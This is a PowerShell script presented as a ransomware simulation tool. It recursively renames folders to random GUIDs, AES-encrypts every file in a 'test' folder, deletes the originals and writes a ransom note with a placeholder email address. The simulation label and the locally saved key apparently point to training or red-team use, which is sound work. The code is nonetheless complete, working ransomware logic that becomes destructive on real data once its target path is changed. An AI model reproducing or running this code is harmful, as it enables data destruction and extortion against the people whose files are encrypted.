# ================================================
#           VEILRON TECHNOLOGIES PTE LTD
#        ADVANCED RANSOMWARE SIMULATION TOOL
# ================================================

# Function to display the banner
function Show-Banner {
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host "        VEILRON TECHNOLOGIES PTE LTD        " -ForegroundColor Green
    Write-Host "    ADVANCED RANSOMWARE SIMULATION TOOL     " -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host "Company: Veilron Technologies Pte Ltd" -ForegroundColor White
    Write-Host "Description: Simulates ransomware behavior by encrypting" -ForegroundColor White
    Write-Host "             and renaming all files and folders." -ForegroundColor White
    Write-Host "=============================================" -ForegroundColor Cyan
}

# Function to generate a random AES encryption key
function Generate-Key {
    $key = New-Object byte[] 32
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
    $keyPath = "$PSScriptRoot\key_file.bin"
    Set-Content -Path $keyPath -Value ([System.Convert]::ToBase64String($key)) -Encoding Ascii
    Write-Host "AES key generated and saved to $keyPath" -ForegroundColor Green
    return $key
}

# Function to encrypt all files
function Encrypt-Data {
    param (
        [string]$FolderPath,
        [byte[]]$EncryptionKey
    )

    # Generate UUID for session
    $sessionID = [guid]::NewGuid()
    Write-Host "Session ID: $sessionID" -ForegroundColor Cyan

    foreach ($file in Get-ChildItem -Path $FolderPath -File -Recurse) {
        try {
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $EncryptionKey
            $aes.GenerateIV()

            # Read file content
            $plainText = Get-Content -Path $file.FullName -Raw -Encoding Byte
            if (-not $plainText) {
                Write-Host "Skipping empty or unreadable file: $($file.FullName)" -ForegroundColor Red
                continue
            }

            # Encrypt content
            $cryptoStream = New-Object System.IO.MemoryStream
            $encryptor = $aes.CreateEncryptor()
            $cryptoStreamWriter = New-Object System.Security.Cryptography.CryptoStream($cryptoStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
            $cryptoStreamWriter.Write($plainText, 0, $plainText.Length)
            $cryptoStreamWriter.Close()

            # Save encrypted file
            $encryptedData = $aes.IV + $cryptoStream.ToArray()
            $newFileName = "$($file.DirectoryName)\$([guid]::NewGuid().ToString()).veilron"
            [System.IO.File]::WriteAllBytes($newFileName, $encryptedData)

            # Delete original file
            Remove-Item -Path $file.FullName

            Write-Host "Encrypted file: $newFileName" -ForegroundColor Yellow
        } catch {
            Write-Host "Error processing file: $($file.FullName)" -ForegroundColor Red
            Write-Host $_.Exception.Message
        }
    }

    # Create ransom note
    $notePath = Join-Path -Path $FolderPath -ChildPath "README.txt"
    Set-Content -Path $notePath -Value @"
Your files and folders have been encrypted and renamed!
Your unique ID: $sessionID
To recover them, send an email to fake_email@domain.com with your unique ID.
"@ -Encoding Ascii
    Write-Host "Ransom note created at $notePath" -ForegroundColor Cyan
}

# Function to rename folders
function Rename-Folders {
    param ([string]$FolderPath)

    # Rename all subfolders recursively from deepest level
    Get-ChildItem -Path $FolderPath -Directory -Recurse | Sort-Object -Property FullName -Descending | ForEach-Object {
        $newName = [guid]::NewGuid().ToString()
        $newPath = Join-Path -Path $_.Parent.FullName -ChildPath $newName
        Rename-Item -Path $_.FullName -NewName $newName -Force
        Write-Host "Renamed folder: $($_.FullName) -> $newPath" -ForegroundColor Yellow
    }

    # Rename the root folder
    $rootNewName = [guid]::NewGuid().ToString()
    $rootNewPath = Join-Path -Path (Get-Item $FolderPath).Parent.FullName -ChildPath $rootNewName
    Rename-Item -Path $FolderPath -NewName $rootNewName -Force
    Write-Host "Renamed root folder: $FolderPath -> $rootNewPath" -ForegroundColor Yellow

    return $rootNewPath
}

# Main Workflow
Show-Banner

# Automatically set up encryption
$testFolder = Join-Path -Path $PSScriptRoot -ChildPath "test"

if (-not (Test-Path $testFolder)) {
    Write-Host "The 'test' folder does not exist in the script directory. Please create it and add files to encrypt." -ForegroundColor Red
    exit
}

# Generate encryption key
$key = Generate-Key

# Rename folders and encrypt files
Write-Host "Starting ransomware simulation in the 'test' folder..." -ForegroundColor Cyan
$newTestFolder = Rename-Folders -FolderPath $testFolder
Encrypt-Data -FolderPath $newTestFolder -EncryptionKey $key

Write-Host "Ransomware simulation completed!" -ForegroundColor Green
